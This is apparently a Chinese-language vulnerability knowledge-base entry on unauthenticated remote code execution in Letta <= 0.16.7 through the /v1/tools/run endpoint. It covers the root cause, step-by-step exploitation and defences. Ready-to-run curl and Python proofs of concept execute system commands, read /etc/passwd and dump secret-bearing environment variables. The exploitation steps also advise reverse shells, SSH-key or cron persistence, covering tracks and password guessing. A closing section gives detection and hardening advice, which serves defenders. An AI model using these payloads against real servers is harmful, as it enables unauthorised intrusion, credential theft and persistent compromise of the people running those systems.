---
id: ai-security-agent-security-letta-tools-run-unauth-code-exec
title: Letta <= 0.16.7 /v1/tools/run 未授权代码执行：source_code 无过滤 + 默认 Actor 回退
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: letta-tools-run-unauth-code-exec
tags:
- ai-agent
- letta
- rce
- unauthenticated
- fastapi
- tool-execution
- default-actor
- sandbox-escape
cve: []
severity: critical
confidence: high
affected_versions: Letta <= 0.16.7
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V133
  verified_at: '2026-11-06T05:40:03+08:00'
  notes: 已对照原文与图01-09核对：tools.py /run 直接透传 source_code、user_manager 默认 Actor 回退、no_default_actor 默认 False、LETTA_SERVER_SECURE 密码保护、调用链及 curl/python PoC 一致；图08 靶机 /v1/health 返回 0.16.6、代码目录为 0.16.7，原文影响范围写 <=0.16.7（写作时最新版）。未验证点：PoC 未本机复跑，截图未显示 id 的 root 输出（正文称 root），原文无 CVE；frontmatter 无 sources/source_url。
url: /docs/ai-security/agent-security/ai-security-agent-security-letta-tools-run-unauth-code-exec/
draft: false
kb_aliases:
- Letta RCE
- /v1/tools/run
- Letta 0.16.7 漏洞
- Letta 未授权代码执行
- Default Actor 回退
- source_code 注入
---

## 一句话结论

Letta <= 0.16.7 的 `/v1/tools/run` 端点把请求中的 `source_code` 原样交给工具执行器，既没有 AST 校验也没有沙箱隔离；同时认证依赖客户端 `user_id` 头，缺省时回退到 `Default Actor`，默认配置下 `no_default_actor=false`、密码保护未启用，因此任何能访问 8283 端口的用户无需凭据即可 POST 任意 Python 代码，以 Letta 进程权限（常见为 root）执行系统命令。

## 原理

- **任意代码执行入口**：`letta/server/rest_api/routers/v1/tools.py` 的 `POST /run` 接收 `ToolRunFromSource`（含 `source_code`、`source_type`、`args`、`env_vars`、`pip_requirements` 等），直接调用 `server.run_tool_from_source(tool_source=request.source_code, ...)`；代码中没有任何过滤、AST 白名单或权限检查。
- **执行链无隔离**：`server.py` 把源码写入临时工具并交给 `services/tool_sandbox/local_sandbox.py`，后者用 `asyncio.create_subprocess_exec` 启动子进程执行；这是本地子进程，不是容器/gVisor 等隔离环境，子进程继承 Letta 服务的用户与权限。
- **认证缺陷**：`services/user_manager.py` 的 `get_actor_or_default_async(actor_id)` 在 `actor_id is None` 时使用 `DEFAULT_USER_ID`，并在找不到时自动创建默认 Actor；`settings.py` 中 `no_default_actor` 默认为 `False`。
- **密码保护未启用**：`CheckPasswordMiddleware` 只有在 `LETTA_SERVER_SECURE=true` 且设置了密码时才生效；默认配置下只校验 `user_id` 头的格式，不校验 Token/Session。
- **组合后果**：未认证请求 → 默认 Actor → `run_tool_from_source` → 本地子进程执行任意 Python → 读取文件、环境变量（模型/数据库/云凭据）、执行系统命令；文章实测权限为 root。

## 触发条件

- 目标运行 Letta <= 0.16.7，`/v1/tools/run` 可从攻击机访问（默认 8283）。
- 使用默认配置：未设置 `LETTA_SERVER_SECURE=true`/密码，`no_default_actor` 保持默认 `False`。
- 目标未在边界限制该端口，或攻击者已进入内网。
- Letta 进程以 root/高权用户运行（文章实测为 root），或至少具备读取敏感文件与环境变量的权限。

## 利用步骤

1. 访问 `http://<target>:8283/v1/tools/run` 或发送一个最小请求，确认端点存在且未要求认证。
2. 构造 JSON：`source_code` 定义函数并用 `os.popen`/`subprocess` 执行命令，`source_type` 为 `python`，`args` 为空对象，`name` 任意。
3. 发送 POST；响应中的 `tool_return` 字段通常包含命令输出。
4. 用 `id`/`uname -a` 确认权限，再读取 `/etc/passwd`、环境变量中的 `KEY`/`SECRET`/`PASS`/`TOKEN`/`DATABASE` 等。
5. 需要交互时改用反弹 shell 或写入计划任务/SSH 公钥；注意清理临时工具与进程。
6. 若目标启用了密码保护，尝试获取/猜测密码，或寻找其他可触达的工具注册/执行路径。

## PoC

```bash
# 执行 id
curl -s -X POST "http://<TARGET>:8283/v1/tools/run" \
  -H "Content-Type: application/json" \
  -d '{
    "source_code": "import os\ndef poc_rce():\n    return os.popen(\"id\").read()\n",
    "source_type": "python",
    "args": {},
    "name": "poc_rce"
  }'

# 读取文件
curl -s -X POST "http://<TARGET>:8283/v1/tools/run" \
  -H "Content-Type: application/json" \
  -d '{
    "source_code": "def read_file():\n    with open(\"/etc/passwd\") as f:\n        return f.read()\n",
    "source_type": "python",
    "args": {},
    "name": "read_file"
  }'

# 读取环境变量中的敏感凭据
curl -s -X POST "http://<TARGET>:8283/v1/tools/run" \
  -H "Content-Type: application/json" \
  -d '{
    "source_code": "import os\ndef leak_env():\n    env = dict(os.environ)\n    keys = [k for k in env if any(s in k.upper() for s in [\"KEY\",\"SECRET\",\"PASS\",\"TOKEN\",\"DATABASE\",\"PG\"])]\n    return {k: env[k] for k in keys}\n",
    "source_type": "python",
    "args": {},
    "name": "leak_env"
  }'
```

```python
import requests

URL = "http://<TARGET>:8283/v1/tools/run"
payload = {
    "source_code": "import os\ndef poc_rce():\n    return os.popen('uname -a').read()\n",
    "source_type": "python",
    "args": {},
    "name": "poc_rce",
}
r = requests.post(URL, json=payload)
print(r.json().get("tool_return", "No output"))
```

## 变体与关联

- 变体：`env_vars` 可向工具进程注入环境变量；`pip_requirements` 可触发依赖安装；`args`/`args_json_schema` 可改变调用参数，但核心仍是 `source_code` 任意执行。
- 变体：若 `/v1/tools/run` 被限制，可寻找其他会执行工具源码的注册/更新接口；同一执行器也可能被 Agent 消息路径触达。
- 变体：`source_type` 若支持其他语言，可换语言执行；Python 路径最直接。
- 关联：[[ai-security-agent-security-letta-ast-whitelist-eval-fallback-bypass]]（0.16.4 AST 白名单异常回退 eval，属于另一条代码执行链）、[[ai-security-agent-security-letta-running-message-eval-rce]]（0.4.1 Running 消息 eval 注入）、[[ai-security-agent-security-langflow-build-public-tmp-data-code-exec]]（同类 Agent 平台代码执行）。
- 边界：文章称影响 <= 0.16.7（写作时最新版），未给出官方 CVE；若目标启用了 `LETTA_SERVER_SECURE` 或 `NO_DEFAULT_ACTOR=true`，未认证路径会被阻断，需要其他前提。

## 检测与防御

- 修复：升级到厂商修复版本；在修复前禁止公网访问 8283，只允许可信网段/VPN。
- 加固：设置 `LETTA_SERVER_SECURE=true` 与强随机密码，启用 `NO_DEFAULT_ACTOR=true`，禁止默认 Actor 自动创建。
- 加固：把工具执行放入强隔离沙箱（gVisor/Firecracker/容器），非 root、只读文件系统、限制出网；不要把模型/数据库/云凭据放在 Letta 进程环境变量中。
- 检测：`POST /v1/tools/run` 的 `source_code` 中出现 `os`、`subprocess`、`popen`、`system`、`open`、`__import__`；Letta 进程异常拉起 shell/子进程；响应 `tool_return` 含命令输出。
- 检测：未带认证头的请求被默认 Actor 接受；`no_default_actor` 配置被改为 False；8283 端口暴露在非管理网段。
- 注意：该端点的设计目的就是运行工具源码，不能仅靠“过滤关键字”修复；必须做认证、授权与强隔离。
